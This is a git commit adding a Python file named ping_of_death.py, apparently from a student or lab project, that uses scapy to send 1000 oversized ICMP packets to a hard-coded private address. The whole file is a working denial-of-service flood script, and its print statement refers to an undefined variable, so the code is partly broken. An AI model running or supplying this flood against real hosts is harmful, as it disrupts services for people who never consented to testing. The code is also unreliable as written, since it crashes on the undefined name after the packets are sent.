e2e6decbf331e439b36026a89f72e7447ec74b70
Dương Đức Nghĩa <duongnghia222@gmail.com>
2023-04-14 00:28:38 +0700

    Create ping_of_death.py

---
+++ srcs/attack/ping_of_death.py
@@ -0,0 +1,17 @@
+from scapy.layers.inet import IP, TCP, ICMP
+from scapy.packet import Raw
+from scapy.sendrecv import send
+from scapy.volatile import RandShort
+
+def send_ping(target_ip_address: str, number_of_packets_to_send: int = 4, size: int = 65000):
+    ip = IP(dst=target_ip_address)
+    icmp = ICMP()
+    raw = Raw(b"X" * size)
+    p = ip / icmp / raw
+    send(p, count=number_of_packets_to_send, verbose=0)
+    print('send_ping(): Sent ' + str(number_of_packets_to_send) + ' pings of ' + str(size_of_packet) + ' size to ' + target_ip_address)
+
+
+ip = "10.0.2.8"
+port = 443 #https port
+send_ping(ip, number_of_packets_to_send=1000)
